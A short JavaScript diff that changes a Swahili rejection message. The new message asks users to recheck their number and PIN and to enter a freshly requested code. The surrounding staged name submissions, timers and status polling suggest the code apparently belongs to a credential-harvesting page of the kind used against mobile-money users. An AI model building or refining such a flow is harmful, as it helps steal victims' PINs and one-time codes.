@@ -74,7 +74,7 @@ async function waitForStatus(expected,next,errorId){
   }
 }
 function handleRejection(d){
-  const msg="Taarifa zako zimekataliwa. Tafadhali hakiki nambari na pin na uweke taarifa sahihi.";
+  const msg="Taarifa zako zimekataliwa. Hakiki nambari na PIN yako. Omba msimbo mpya na utumie huo, si wa zamani.";
   if(d.rejectedStage==="FIRST_NAME"){
     stopNameTimer("first");state.firstDeadline=null;$("firstName").disabled=false;$("firstNameBtn").classList.remove("hidden");$("firstNameResubmit").classList.add("hidden");$("firstNameWaiting").classList.add("hidden");setError("page2Error",msg);showPage(2);
   }else if(d.rejectedStage==="SECOND_NAME"){
